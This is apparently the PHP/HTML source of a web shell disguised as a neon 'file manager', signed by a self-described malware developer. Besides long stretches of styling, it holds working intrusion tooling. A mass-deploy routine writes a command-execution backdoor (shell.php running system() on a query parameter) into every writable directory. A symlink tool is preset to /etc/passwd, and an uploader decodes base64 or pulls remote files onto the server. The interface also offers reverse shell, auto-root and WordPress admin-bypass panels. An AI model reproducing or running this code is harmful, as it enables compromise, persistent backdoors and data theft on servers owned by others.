...
// ==========================================
$auth_hash = '$2y$10$V3yXz6Ix8jQ1yRSF7HXcv.LrFwbmrhV9GtqTvFvOkVXtcAUrdvlNK'; 
...
// ==========================================
// --- 4. SCRIPT BACKGROUND TERMINAL (NIGHT EDITION) ---
// ==========================================
$bg_terminal_js = "
    ...
    const logsData = [
        ...
        '[+] NEON GRID OVERDRIVE: PROTOCOL CYAN ACTIVE',
        ...
        '[!] NEON PURPLE OVERLOAD: QUANTUM BREACH DETECTED',
        'root@HxN×ELV:~# clear',
        '[ CYAN ] quantum-tunnel established on eth0',
        '[ PURPLE ] neural-interface synchronized',
        '[ MAGENTA ] payload injection complete',
        '[ GREEN ] access granted to sector-7g',
        '[ RED ] firewall breach in progress',
        'root@HxN×ELV:~# cat /etc/neon.conf',
        'NEON_MODE=cyberpunk | GRID=overdrive | COLOR_SCHEME=night',
        'root@HxN×ELV:~# ./pwn --target 0.0.0.0 --port 4444',
        '[+] Reverse shell connected: 10.0.0.1:4444',
        '[ CYAN ] encrypted channel :: AES-256-GCM',
        '[ PURPLE ] post-exploitation module loaded'
    ];
    const logColors = ['#00e5ff', '#8a2be2', '#ff00ff', '#00ff88', '#ff1493', '#ffd700', '#ff6600', '#ff0044'];
    let currentLogs = [];
    let maxLines = Math.floor(canvasBg.height / 22);
    let startLines = Math.floor(maxLines / 1.1); 
...
<head>
    ...
    <meta name="secret-id" content="[ Malware Dev HxN | E.L.V Engine © 2026 ]">
    <title>HxN | E.L.V F.M (Cyberpunk Metrocity Night)</title>
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
    :root { 
        --neon-pink: #ff1493;
        --neon-cyan: #00e5ff; 
        --neon-cyan-bright: #33f0ff;
        --neon-purple: #8a2be2; 
        --neon-purple-bright: #b066ff;
        --neon-magenta: #ff00ff;
        --neon-magenta-bright: #ff66ff;
        --neon-yellow: #ffd700;
        --neon-green: #00ff88;
        --neon-orange: #ff6600;
        --neon-red: #ff0044;
    ...
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { 
        background: linear-gradient(135deg, #05081a 0%, #0a0f2e 30%, #0d1238 50%, #05081a 70%, #0a0520 100%);
        color: #e0e0ff; 
    ...
    body::before {
        ...
        background: 
            radial-gradient(circle at 15% 25%, rgba(0,229,255,0.15) 0%, transparent 45%),
            radial-gradient(circle at 85% 20%, rgba(138,43,226,0.2) 0%, transparent 45%),
            radial-gradient(circle at 50% 80%, rgba(255,0,255,0.08) 0%, transparent 45%),
            radial-gradient(circle at 30% 70%, rgba(0,255,136,0.05) 0%, transparent 40%),
            radial-gradient(circle at 70% 60%, rgba(255,20,147,0.05) 0%, transparent 40%);
        pointer-events: none;
        z-index: 0;
    }
    #terminal-bg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 0; opacity: 0.75; }
    .scanline { 
    ...
    .cyber-frame { 
        width: 92%; max-width: 720px; padding: 4px; 
        background: linear-gradient(135deg, var(--neon-cyan), var(--neon-purple), var(--neon-magenta), var(--neon-cyan-bright), var(--neon-purple-bright)); 
        background-size: 400% 400%;
        animation: border-pulse 5s ease-in-out infinite;
        border-radius: 10px; 
        box-shadow: 0 0 60px rgba(0,229,255,0.25), 0 0 100px rgba(138,43,226,0.15), 0 0 40px rgba(255,0,255,0.1); 
    ...
    .logo-box img {
        ...
        height: auto;
        opacity: 0.9;
        filter: drop-shadow(0 0 20px rgba(0,229,255,0.3)) drop-shadow(0 0 40px rgba(138,43,226,0.2)) drop-shadow(0 0 60px rgba(255,0,255,0.1));
        transition: all 0.4s ease;
    }
    .logo-box img:hover {
        opacity: 1;
        filter: drop-shadow(0 0 30px rgba(0,229,255,0.5)) drop-shadow(0 0 60px rgba(138,43,226,0.3)) drop-shadow(0 0 80px rgba(255,0,255,0.2));
        transform: scale(1.03);
    }
    .term-output { font-size: 13px; line-height: 1.8; margin-bottom: 18px; color: #e0e0ff; font-weight: 400; width: 100%; min-height: 120px; }
    .cyan-text { color: var(--neon-cyan); text-shadow: 0 0 8px rgba(0,229,255,0.4), 0 0 16px rgba(0,229,255,0.2); }
    .magenta-text { color: var(--neon-magenta); text-shadow: 0 0 8px rgba(255,0,255,0.4), 0 0 16px rgba(255,0,255,0.2); }
    .gold-text { color: var(--neon-yellow); text-shadow: 0 0 8px rgba(255,215,0,0.3), 0 0 16px rgba(255,215,0,0.15); }
    .purple-text { color: var(--neon-purple); text-shadow: 0 0 8px rgba(138,43,226,0.4), 0 0 16px rgba(138,43,226,0.2); }
    .green-text { color: var(--neon-green); text-shadow: 0 0 8px rgba(0,255,136,0.3), 0 0 16px rgba(0,255,136,0.15); }
    .pink-text { color: var(--neon-pink); text-shadow: 0 0 8px rgba(255,20,147,0.3), 0 0 16px rgba(255,20,147,0.15); }
    #login-form { display: none; margin-top: 10px; border-top: 3px solid; border-image: linear-gradient(90deg, var(--neon-cyan), var(--neon-purple), var(--neon-magenta), var(--neon-cyan-bright)) 1; padding-top: 18px; animation: slideUp 0.5s ease-out; width: 100%; }
    ...
    .input-group:focus-within { 
        ...
        box-shadow: 0 0 20px rgba(0,229,255,0.1), 0 0 10px rgba(138,43,226,0.05); 
    }
    .prompt { 
        color: var(--neon-cyan); 
        margin-right: 12px; 
    ...
    input:focus { text-shadow: 0 0 8px rgba(138,43,226,0.3); }
    input::placeholder { color: rgba(0,229,255,0.08); letter-spacing: 3px; }
    button { 
        width: 100%; 
        padding: 16px; 
        background: transparent; 
    ...
    button:hover { 
        ...
        color: #fff; 
        box-shadow: 0 0 30px rgba(0,229,255,0.2), 0 0 60px rgba(138,43,226,0.1), inset 0 0 10px rgba(0,229,255,0.02); 
        border-color: var(--neon-cyan-bright); 
    }
    .term-error { 
        color: var(--neon-pink); 
        ...
        text-transform: uppercase; 
        letter-spacing: 2px; 
        box-shadow: 0 0 20px rgba(255,20,147,0.08), 0 0 40px rgba(255,20,147,0.04); 
        width: 100%; 
        border-radius: 5px;
    }
    .cursor { 
    ...
    @media (max-width: 600px) { .logo-box img { max-width: 95%; } .inner-terminal { padding: 18px 14px; } }
    </style>
</head>
<body>
    ...
    <div class="cyber-frame">
        <div class="inner-terminal">
            ...
            <form id="login-form" method="POST">
                ...
                <button type="submit">[ AUTHENTICATE TO NEON NIGHT ]</button>
            </form>
        </div>
    </div>
    <script>
        ...
        async function bootSequence() {
            if(hasError) { 
                termText.innerHTML = "<div><span class='cyan-text'>[sys]</span> Auth token rejected.</div><div><span class='pink-text'>[!] INITIATING DEFENSIVE PROTOCOL</span></div>"; 
                loginForm.style.display = "block"; 
                return; 
            }
            const seq = [
                { t: "<span class='cyan-text'>[*]</span> Connecting to MetroCity Night mainframe...", d: 10 },
                ...
                { t: "<span class='purple-text'>[*]</span> Bypassing neon quantum encryption... [SUCCESS]", d: 15 },
                { t: "<span class='purple-text'>[*]</span> Mounting encrypted cyber-volumes...", d: 10 },
                { t: "<span class='magenta-text'>[+]</span> Neural interface synchronized.", d: 10 },
                { t: "<span class='green-text'>[+]</span> Quantum tunnel established on eth0.", d: 10 },
                { t: "<span class='gold-text'>[!]</span> AUTHENTICATION REQUIRED TO ACCESS METROCITY NIGHT.<span class='cursor'></span>", d: 0 }
            ];
...
// ===== FIX: UNZIP - Pindah ke handler global =====
if(isset($_POST['unzip_f'])) { 
    ...
    if ($zip->open($zip_file) === TRUE) { 
        $zip->extractTo($dir); 
        $zip->close(); 
        $status_msg = "[+] UNZIP SUCCESS: [ " . basename($zip_file) . " ] EXTRACTED TO CURRENT SECTOR";
        echo "<script>setTimeout(function(){ window.location='?d=".urlencode($dir)."'; }, 1000);</script>";
    } else { 
        $status_msg = "[-] FAILED TO UNZIP: [ " . basename($zip_file) . " ]"; 
    } 
}
...
// ===== FIX: MASS DEPLOY - Handler tunggal di sini =====
if (isset($_POST['mass_deploy'])) { 
    $target_root = $_POST['target_root']; 
    $file_name = safeName($_POST['mass_name']); 
    ...
    if (is_dir($target_root)) { 
        ...
        if ($folders) {
            foreach ($folders as $folder) { 
                ...
                if ($folder != '.' && $folder != '..' && is_dir($path) && is_writable($path)) { 
        ...
        $status_msg = "MASS DEPLOY: $count SECTORS INJECTED"; 
        if ($count > 0) { 
            $result_text = implode("\n", $injected_targets); 
            $status_msg .= "<br><br><b style='color:var(--neon-pink);'>[ RESULT MASS DEPLOY ]</b><br>"; 
            $status_msg .= "<textarea style='width:100%; height:200px; margin-top:10px; background:rgba(0,229,255,0.02); border:1px solid var(--neon-purple); color:var(--text-primary); font-family:monospace; padding:10px; resize:vertical;' readonly>" . htmlspecialchars($result_text) . "</textarea>"; 
        } else {
            $status_msg .= "<br>NO WRITABLE SECTORS FOUND.";
        }
    } else { 
...
if (isset($_POST['create_symlink'])) {
    $target_path = $_POST['symlink_target'];
    $link_name = safeName($_POST['symlink_name']);
    $link_path = $dir . '/' . $link_name;
    if (!empty($target_path) && !empty($link_name)) {
        if (!file_exists($link_path)) {
            if (@symlink($target_path, $link_path)) {
                $status_msg = "[+] SYMLINK CREATED: [ " . $link_name . " ] → [ " . $target_path . " ]";
            } else {
                $status_msg = "[-] FAILED TO CREATE SYMLINK. CHECK PERMISSIONS.";
            }
        } else {
            $status_msg = "[-] SYMLINK NAME ALREADY EXISTS.";
        }
    }
}
...
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> HxN | E.L.V FILEMANAGER v13.0 // CYBERPUNK METROCITY NIGHT </title>
    ...
    <style>
        :root { 
            ...
            --neon-pink-glow: 0 0 8px rgba(255,20,147,0.4), 0 0 16px rgba(255,20,147,0.2);
            --neon-cyan: #00e5ff; 
            --neon-cyan-bright: #33f0ff;
            --neon-cyan-dim: #66f0ff;
            --neon-cyan-glow: 0 0 8px rgba(0,229,255,0.4), 0 0 16px rgba(0,229,255,0.2);
            --neon-purple: #8a2be2; 
            --neon-purple-bright: #b066ff;
            --neon-purple-dim: #b066ff;
            --neon-purple-glow: 0 0 12px rgba(138,43,226,0.4), 0 0 24px rgba(138,43,226,0.2);
            --neon-magenta: #ff00ff;
            --neon-magenta-bright: #ff66ff;
            --neon-magenta-dim: #ff66ff;
            --neon-magenta-glow: 0 0 10px rgba(255,0,255,0.4), 0 0 20px rgba(255,0,255,0.2);
            --neon-yellow: #ffd700; 
            --neon-yellow-dim: #ffe066;
            --neon-yellow-glow: 0 0 8px rgba(255,215,0,0.3), 0 0 16px rgba(255,215,0,0.15);
            --neon-green: #00ff88; 
            --neon-green-dim: #66ffaa;
            --neon-green-glow: 0 0 8px rgba(0,255,136,0.3), 0 0 16px rgba(0,255,136,0.15);
            --neon-red: #ff0044; 
            --neon-red-dim: #ff6688;
            --neon-red-glow: 0 0 8px rgba(255,0,68,0.3), 0 0 16px rgba(255,0,68,0.15);
            --neon-orange: #ff6600; 
            --neon-orange-dim: #ff9944;
            --neon-orange-glow: 0 0 8px rgba(255,102,0,0.3), 0 0 16px rgba(255,102,0,0.15);
            --bg-primary: #05081a; 
            --bg-secondary: #0a0f2e; 
            --bg-surface: #0d1238; 
            --bg-card: #0d1238; 
        ...
        * { box-sizing: border-box; }
        ...
        body {
            ...
            background-image: 
                ...
                radial-gradient(ellipse at 90% 15%, rgba(138,43,226,0.12) 0%, transparent 50%), 
                radial-gradient(ellipse at 50% 85%, rgba(255,0,255,0.06) 0%, transparent 50%),
                radial-gradient(ellipse at 30% 60%, rgba(0,255,136,0.03) 0%, transparent 40%);
        ...
        #terminal-bg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 0; opacity: 0.65; }
        ...
        .neon-divider {
            ...
            margin: 18px 0;
            border-radius: 2px;
            background: linear-gradient(90deg, var(--neon-cyan), var(--neon-purple), var(--neon-magenta), var(--neon-cyan-bright), var(--neon-purple-bright), var(--neon-cyan));
            background-size: 300% 100%;
            animation: divider-flow 4s linear infinite;
            box-shadow: 0 0 20px rgba(0,229,255,0.2), 0 0 20px rgba(138,43,226,0.2), 0 0 10px rgba(255,0,255,0.1);
        }
        .neon-divider-thin {
            height: 2px;
            margin: 12px 0;
            border-radius: 1px;
            background: linear-gradient(90deg, transparent, var(--neon-cyan), var(--neon-purple), var(--neon-magenta), var(--neon-cyan-bright), transparent);
            opacity: 0.7;
        }
        ...
        .container {
            ...
            background-image: 
                radial-gradient(ellipse at 20% 10%, rgba(0,229,255,0.06) 0%, transparent 45%), 
                radial-gradient(ellipse at 80% 90%, rgba(138,43,226,0.06) 0%, transparent 45%);
            border: 1px solid rgba(0,229,255,0.08); 
            padding: 24px;
            box-shadow: 0 0 80px rgba(0,229,255,0.06), 0 0 60px rgba(138,43,226,0.08), 0 4px 20px rgba(0,0,0,0.3);
            border-radius: 10px; 
            margin: 0 auto; 
            width: 100%; 
            max-width: 1440px; 
        ...
        .header { 
            ...
            border-image: linear-gradient(90deg, var(--neon-cyan), var(--neon-purple), var(--neon-magenta), var(--neon-cyan-bright)) 1;
            background: rgba(0,229,255,0.02);
        ...
        .brand-logo-circle:hover {
            box-shadow: 0 0 30px rgba(0,229,255,0.4), 0 0 60px rgba(138,43,226,0.2);
        }
        .brand-logo-circle img { width: 100%; height: 100%; object-fit: contain; filter: brightness(1.2); }
        .brand-text { display: flex; flex-direction: column; }
        .brand-title { 
            color: var(--neon-cyan); 
            font-size: 13px; 
            font-weight: 700; 
            text-shadow: 0 0 5px rgba(0,229,255,0.3), 0 0 10px rgba(0,229,255,0.1);
            letter-spacing: 2px;
            margin: 0;
            line-height: 1.2;
        }
        ...
        .brand-sub img { 
            height: 45px; 
            width: auto; 
            filter: brightness(1.3) contrast(1.1) drop-shadow(0 0 10px rgba(0,229,255,0.2));
            display: block;
        }
        .brand-year {
        ...
        .btn-logout-top:hover { 
            ...
            box-shadow: 0 0 20px rgba(255,20,147,0.25), 0 0 40px rgba(255,20,147,0.1); 
        ...
        .hud-item:hover { border-color: var(--neon-cyan); box-shadow: var(--neon-cyan-glow); }
        .hud-item b { 
            color: var(--neon-cyan-bright); 
            display: block; 
            margin-bottom: 3px; 
        ...
        .elv-neon-panel::before { 
            ...
            border-radius: 8px; 
            background: linear-gradient(45deg, var(--neon-cyan), var(--neon-purple), var(--neon-magenta), var(--neon-green), var(--neon-cyan-bright)); 
            background-size: 400% 400%; 
            z-index: -1; 
            animation: border-disco 5s linear infinite; 
            opacity: 0.1; 
        }
        ...
        .ascii-nav-btn { 
            ...
            cursor: pointer; 
            transition: all 0.3s ease; 
            animation: ascii-border-disco 4s linear infinite; 
        }
        @keyframes ascii-border-disco { 
            0% { border-color: var(--neon-cyan); box-shadow: 0 0 8px var(--neon-cyan); } 
            25% { border-color: var(--neon-purple); box-shadow: 0 0 8px var(--neon-purple); } 
            50% { border-color: var(--neon-magenta); box-shadow: 0 0 8px var(--neon-magenta); } 
            75% { border-color: var(--neon-cyan-bright); box-shadow: 0 0 8px var(--neon-cyan-bright); } 
            100% { border-color: var(--neon-cyan); box-shadow: 0 0 8px var(--neon-cyan); } 
        }
        .ascii-nav-btn:hover { 
            transform: scale(1.06); 
            background: rgba(0,229,255,0.04); 
        ...
        .tools-title { 
            color: var(--neon-cyan-bright); 
            text-align: center; 
            text-shadow: 0 0 6px rgba(0,229,255,0.3), 0 0 12px rgba(138,43,226,0.15); 
            letter-spacing: 4px; 
            margin: 0 0 16px 0; 
            font-size: 16px; 
            font-weight: 700; 
        ...
        .icon-tool { font-size: 24px; margin-bottom: 8px; color: var(--neon-purple); text-shadow: 0 0 5px rgba(138,43,226,0.3); }
        .tool-text-gold-wrap { 
            background: rgba(0,229,255,0.02); 
        ...
        .home-btn:hover { color: var(--neon-purple-bright); text-shadow: 0 0 10px rgba(138,43,226,0.3); }
        .breadcrumb a { color: var(--text-primary); text-decoration: none; font-weight: 700; font-size: 14px; transition: color 0.2s; }
        .breadcrumb a:hover { color: var(--neon-cyan); text-shadow: 0 0 6px rgba(0,229,255,0.3); }
        ...
        .neon-cyan-box:hover { border-color: var(--neon-cyan); box-shadow: var(--neon-cyan-glow); }
        .btn-cyan-glow { 
            background: transparent; 
        ...
        .btn-act-small:hover { transform: scale(1.25); }
        .act-dl:hover { color: var(--neon-cyan); text-shadow: 0 0 8px rgba(0,229,255,0.4); }
        .act-cp:hover { color: var(--neon-green); text-shadow: 0 0 8px rgba(0,255,136,0.4); }
        .act-del:hover { color: var(--neon-pink); text-shadow: 0 0 8px rgba(255,20,147,0.4); }
        ...
        td { padding: 10px 14px; border-bottom: 1px solid rgba(0,229,255,0.02); vertical-align: middle; color: var(--text-primary); font-size: 13px; }
        .item-t { 
            text-decoration: none; 
            font-weight: 700; 
            font-size: 15px; 
        ...
        .item-t[data-writable="1"] { color: var(--neon-green) !important; text-shadow: 0 0 5px rgba(0,255,136,0.3); }
        .item-t[data-writable="0"] { color: var(--neon-pink) !important; text-shadow: 0 0 5px rgba(255,20,147,0.3); }
        .item-t:hover { color: var(--neon-cyan) !important; text-shadow: 0 0 8px rgba(0,229,255,0.4); }
        .dir-label { font-weight: 700; margin-right: 3px; font-size: 16px; }
        .dir-label[data-type="dir"] { color: var(--neon-magenta); text-shadow: 0 0 5px rgba(255,0,255,0.3); }
        .dir-label[data-type="file"] { color: var(--neon-cyan); text-shadow: 0 0 5px rgba(0,229,255,0.3); }
        .chmod-writable { color: var(--neon-green) !important; text-shadow: 0 0 5px rgba(0,255,136,0.3); }
        .chmod-nonwritable { color: var(--neon-pink) !important; text-shadow: 0 0 5px rgba(255,20,147,0.3); }
        ...
        .console { 
            ...
            border-radius: 5px; 
            font-family: inherit;
            text-shadow: 0 0 5px rgba(0,255,136,0.15);
        }
        .console pre { 
            color: var(--neon-green); 
            margin: 0; 
        ...
        .cyber-cmd-input::placeholder { color: rgba(224,224,255,0.08); }
        .cyber-exec-btn { 
            background: transparent; 
            border: 2px solid var(--neon-purple-dim); 
            color: var(--neon-purple-bright); 
        ...
        .card-autoroot { border-left: 3px solid var(--neon-purple) !important; }
        .card-recon { border-left: 3px solid var(--neon-cyan) !important; }
        .card-wpadmin { border-left: 3px solid var(--neon-green) !important; }
        .card-revshell { border-left: 3px solid var(--neon-magenta) !important; }
        .card-mass { border-left: 3px solid var(--neon-yellow) !important; }
        .card-bypass406 { border-left: 3px solid var(--neon-orange) !important; }
        .card-symlink { border-left: 3px solid var(--neon-magenta-bright) !important; }
        ...
        <div class="header">
            <div class="header-brand">
                <div class="brand-logo-circle">
                    <img src="<?= $logo_inner ?>" alt="ELV">
                </div>
                <div class="brand-text">
                    <div class="brand-sub">
                        <img src="https://d.top4top.io/p_3839nayyc0.png" alt="Logo">
                    </div>
                    <div class="brand-year">[ CYBERPUNK METROCITY NIGHT EDITION ]</div>
                    <div class="brand-title">[ HxN | t.me/HxNoname ]</div>
                </div>
            </div>
...
╚══════╝ ╚══════╝   ╚══╝</pre>
        ...
        if(@$_GET['mode'] == 'elv_tools') { ?>
            <div class="cyber-tools-interface">
                <h2 class="tools-title">[ E.L.V ENGINE ® v13.0 // NEON NIGHT ]</h2>
                <div class="neon-divider-thin"></div>
                <div class="tools-grid-cyber">
                    ...
                    <a href="?d=<?= urlencode($dir) ?>&mode=symlink" class="cyber-tool-card card-symlink">
                        <i class="fa-solid fa-link icon-tool"></i>
                        <div class="tool-text-gold-wrap">
                            <h3>SYMLINK USER</h3>
                            <p>Create symbolic links to any target path.</p>
                        </div>
                    </a>
                </div>
            </div>
        ...
        elseif(isset($_GET['autoroot']) && $_GET['autoroot'] == '1'){ ?>
            <div style="border:2px solid var(--neon-purple); text-align:center; padding:20px; background:rgba(0,229,255,0.02); border-radius:6px;">
                <h3 style="color:var(--neon-purple-bright); margin-top:0; text-shadow:0 0 10px rgba(170,0,255,0.4);">EXECUTE AUTOMATED ROOT SCAN & EXPLOIT?</h3>
                <div style="display:flex; justify-content:center; gap:15px; margin-top:15px;">
                    <a href="?d=<?= urlencode($dir) ?>&autoroot=exec" style="color:var(--neon-cyan); font-weight:700; padding:12px 30px; border:2px solid var(--neon-cyan-dim); text-decoration:none; border-radius:5px; transition:all 0.3s; box-shadow:var(--neon-cyan-glow);">[ YES ]</a>
                    <a href="?d=<?= urlencode($dir) ?>" style="color:var(--neon-magenta); font-weight:700; padding:12px 30px; border:2px solid var(--neon-pink-dim); text-decoration:none; border-radius:5px; transition:all 0.3s; box-shadow:var(--neon-magenta-glow);">[ NO ]</a>
                </div>
            </div>
        <?php }
        // ==========================================
        ...
        elseif(isset($_GET['semiauto'])) { ?>
            <div class="console" style="border-top-color:var(--neon-cyan);">
                <h3 style="color:var(--neon-cyan); margin-top:0; text-align:center; text-shadow:0 0 8px rgba(0,255,136,0.3);">[ SEMI-AUTO RECON & JUMP ]</h3>
                <div class="neon-divider-thin"></div>
                <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap:15px; margin-top:15px;">
                    <div style="border:1px dashed var(--neon-cyan); padding:10px; background:rgba(0,229,255,0.03); border-radius:4px;">
                        <b style="color:var(--neon-cyan); display:block; margin-bottom:10px; text-align:center; text-shadow:0 0 5px rgba(0,255,136,0.3);">[ WRITABLE DIRECTORIES ]</b>
                        <?php
                        ...
                        foreach($scan_targets as $path => $label) {
                            if(@is_writable($path)) { 
                                $found_dir = true;
                                echo '<a href="?d='.urlencode($path).'" style="display:block; border:1px solid var(--neon-cyan-dim); color:var(--neon-cyan); text-decoration:none; padding:8px; text-align:center; margin-bottom:5px; border-radius:3px; transition:all 0.2s; box-shadow:var(--neon-cyan-glow);">JUMP &rarr; '.$label.'</a>'; 
                            }
                        }
                        if(!$found_dir) echo "<div style='text-align:center; color:var(--text-dim);'>NO WRITABLE DIR FOUND</div>";
                        ?>
                    </div>
                    <div style="border:1px dashed var(--neon-magenta); padding:10px; background:rgba(255,0,255,0.02); border-radius:4px;">
                        <b style="color:var(--neon-magenta); display:block; margin-bottom:10px; text-align:center; text-shadow:0 0 5px rgba(255,0,255,0.3);">[ TARGET SENSITIVE FILES ]</b>
                        <?php
                        ...
                        foreach([$dir, dirname($dir), $_SERVER['DOCUMENT_ROOT']] as $base_scan) {
                            foreach($interesting_files as $ifile) {
                                ...
                                if(@file_exists($full_path) && @is_readable($full_path)) { 
                                    $found_file = true;
                                    echo '<a href="?edit='.urlencode($full_path).'&d='.urlencode($dir).'" style="display:block; border:1px solid var(--neon-magenta-dim); color:var(--neon-magenta); text-decoration:none; padding:8px; text-align:center; margin-bottom:5px; border-radius:3px; transition:all 0.2s; box-shadow:var(--neon-magenta-glow);">EDIT &rarr; '.$ifile.'</a>'; 
                                }
                            }
                        }
        ...
        elseif(isset($_GET['revshell'])) { ?>
            <div class="console" style="border-top-color:var(--neon-magenta);">
                <h3 style="color:var(--neon-magenta); margin-top:0; text-align:center; text-shadow:0 0 8px rgba(255,0,255,0.4);">[ TACTICAL REVERSE SHELL ]</h3>
                <div class="neon-divider-thin"></div>
                <form method="post" style="display:flex; flex-direction:column; gap:10px; margin-top:15px;">
                    ...
                    <button type="submit" name="launch_rev" style="color:var(--neon-magenta); width:100%; font-weight:700; letter-spacing:3px; font-size:14px; padding:15px; border:2px solid var(--neon-magenta-dim); background:transparent; cursor:pointer; border-radius:5px; transition:all 0.3s; box-shadow:var(--neon-magenta-glow);">[ INITIATE CONNECTION ]</button>
                </form>
...
------------------------------------------</pre>
<div class="neon-divider-thin"></div>
<a href="?d=<?= urlencode($dir) ?>&action=wp_bypass" style="color:var(--neon-cyan); border:2px solid var(--neon-cyan-dim); background:transparent; width:100%; text-decoration:none; text-align:center; display:block; padding:15px; font-size:14px; font-weight:700; border-radius:5px; transition:all 0.3s; box-shadow:var(--neon-cyan-glow);">[ LAUNCH EXPLOIT: AUTO LOGIN ADMIN ]</a>
                </div>
                <?php
        ...
        ?>
            <div class="cyber-tools-interface">
                <h2 class="tools-title">[ MASS DEPLOYMENT ENGINE ]</h2>
                <div class="neon-divider-thin"></div>
                <form method="post" style="display:flex; flex-direction:column; gap:12px; margin-top:12px;">
                    <div>
                        <label style="color:var(--neon-cyan); font-size:11px; display:block; margin-bottom:4px;">TARGET ROOT DIRECTORY</label>
                        <input type="text" name="target_root" value="<?= htmlspecialchars($dir) ?>" placeholder="/path/to/target/root" style="border-color:var(--neon-yellow);">
                    </div>
                    <div>
                        <label style="color:var(--neon-cyan); font-size:11px; display:block; margin-bottom:4px;">FILE NAME</label>
                        <input type="text" name="mass_name" value="shell.php" placeholder="payload.php" style="border-color:var(--neon-yellow);">
                    </div>
                    <div>
                        <label style="color:var(--neon-cyan); font-size:11px; display:block; margin-bottom:4px;">PAYLOAD CONTENT</label>
                        <textarea name="mass_content" rows="6" placeholder="&lt;?php ..." style="width:100%; font-family:monospace; border-color:var(--neon-yellow);"><?= htmlspecialchars('<?php system($_GET["cmd"]); ?>') ?></textarea>
                    </div>
                    <button type="submit" name="mass_deploy" class="btn-cyan-glow" style="border-color:var(--neon-yellow); color:var(--neon-yellow); box-shadow:var(--neon-yellow-glow); padding:14px;">[ EXECUTE MASS DEPLOY ]</button>
                </form>
            </div>
        <?php }
        // ==========================================
        // --- MODE: SYMLINK ---
        // ==========================================
        elseif(isset($_GET['mode']) && $_GET['mode'] == 'symlink') {
        ?>
            <div class="cyber-tools-interface">
                <h2 class="tools-title">[ SYMLINK USER ]</h2>
                <div class="neon-divider-thin"></div>
                <form method="post" style="display:flex; flex-direction:column; gap:12px; margin-top:12px;">
                    <div>
                        <label style="color:var(--neon-magenta); font-size:11px; display:block; margin-bottom:4px;">TARGET PATH (absolute path yang mau di-link)</label>
                        <input type="text" name="symlink_target" value="/etc/passwd" placeholder="/path/to/target" style="border-color:var(--neon-magenta);">
                    </div>
                    <div>
                        <label style="color:var(--neon-magenta); font-size:11px; display:block; margin-bottom:4px;">SYMLINK NAME (nama yang muncul di folder ini)</label>
                        <input type="text" name="symlink_name" value="passwd_link" placeholder="my_symlink" style="border-color:var(--neon-magenta);">
                    </div>
                    <button type="submit" name="create_symlink" class="btn-cyan-glow" style="border-color:var(--neon-magenta); color:var(--neon-magenta); box-shadow:var(--neon-magenta-glow); padding:14px;">[ CREATE SYMLINK ]</button>
                </form>
                <div style="margin-top:15px; font-size:11px; color:var(--text-dim); border:1px dashed var(--neon-magenta-dim); padding:10px; border-radius:4px;">
                    <span style="color:var(--neon-magenta); font-weight:bold;">[!] INFO:</span><br>
                    Symlink akan dibuat di <code style="color:var(--neon-cyan);"><?= htmlspecialchars($dir) ?></code><br>
                    Contoh: Target <code>/etc/passwd</code> → Nama <code>passwd_link</code> → Bisa dibuka & diedit dari file manager.
                </div>
            </div>
        <?php }
        // ==========================================
        // --- MODE: BYPASS 406 ---
        // ==========================================
        elseif(isset($_GET['mode']) && $_GET['mode'] == 'bypass406') {
            $b64_written = false;
            $url_grabbed = false;
            
            if (isset($_POST['do_bypass_b64'])) {
                $b64_filename = safeName($_POST['b64_filename']);
                $b64_content = @base64_decode($_POST['b64_data']);
                if (!empty($b64_filename) && $b64_content !== false && !empty($b64_content)) {
                    if (@file_put_contents($dir . '/' . $b64_filename, $b64_content)) {
                        $b64_written = "[+] B64 WRITER SUCCESS: " . $b64_filename . " (" . strlen($b64_content) . " bytes)";
                    } else {
                        $b64_written = "[-] FAILED TO WRITE FILE";
                    }
                } else {
                    $b64_written = "[-] INVALID BASE64 DATA OR FILENAME";
                }
            }
            
            if (isset($_POST['do_bypass_url'])) {
                $remote_url = $_POST['remote_url'];
                $url_filename = safeName($_POST['url_filename']);
                if (!empty($remote_url) && !empty($url_filename)) {
                    $remote_content = @file_get_contents($remote_url);
                    if ($remote_content !== false) {
                        if (@file_put_contents($dir . '/' . $url_filename, $remote_content)) {
                            $url_grabbed = "[+] REMOTE GRAB SUCCESS: " . $url_filename . " from " . $remote_url;
                        } else {
                            $url_grabbed = "[-] FAILED TO WRITE GRABBED FILE";
                        }
                    } else {
                        $url_grabbed = "[-] FAILED TO FETCH REMOTE URL";
                    }
                }
            }
            ?>
            <div class="cyber-tools-interface">
                <h2 class="tools-title">[ 406 BYPASS UPLOAD ENGINE ]</h2>
                <div class="neon-divider-thin"></div>
                
                <?php if($b64_written): ?>
                    <div class="notif-success"><?= $b64_written ?></div>
                <?php endif; ?>
                <?php if($url_grabbed): ?>
                    <div class="notif-success"><?= $url_grabbed ?></div>
                <?php endif; ?>
                
                <div style="display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-top:12px;">
                    <div style="border:1px solid var(--neon-orange-dim); padding:14px; border-radius:6px; background:rgba(255,102,0,0.02);">
                        <h3 style="color:var(--neon-orange); margin-top:0; text-shadow:0 0 8px rgba(255,102,0,0.3); text-align:center;">[ BASE64 WRITER ]</h3>
                        <form method="post">
                            <div style="margin-bottom:8px;">
                                <label style="color:var(--text-secondary); font-size:10px;">FILENAME</label>
                                <input type="text" name="b64_filename" value="shell.php" placeholder="file.php" style="border-color:var(--neon-orange);">
                            </div>
                            <div style="margin-bottom:8px;">
                                <label style="color:var(--text-secondary); font-size:10px;">BASE64 CONTENT</label>
                                <textarea name="b64_data" rows="5" placeholder="base64_encoded_data..." style="width:100%; border-color:var(--neon-orange); font-family:monospace;"></textarea>
                            </div>
                            <button type="submit" name="do_bypass_b64" class="btn-cyan-glow" style="border-color:var(--neon-orange); color:var(--neon-orange); box-shadow:var(--neon-orange-glow); width:100%;">[ DECODE & WRITE ]</button>
                        </form>
                    </div>
                    <div style="border:1px solid var(--neon-cyan-dim); padding:14px; border-radius:6px; background:rgba(0,229,255,0.02);">
                        <h3 style="color:var(--neon-cyan); margin-top:0; text-shadow:0 0 8px rgba(0,229,255,0.3); text-align:center;">[ REMOTE URL GRABBER ]</h3>
                        <form method="post">
                            <div style="margin-bottom:8px;">
                                <label style="color:var(--text-secondary); font-size:10px;">REMOTE URL</label>
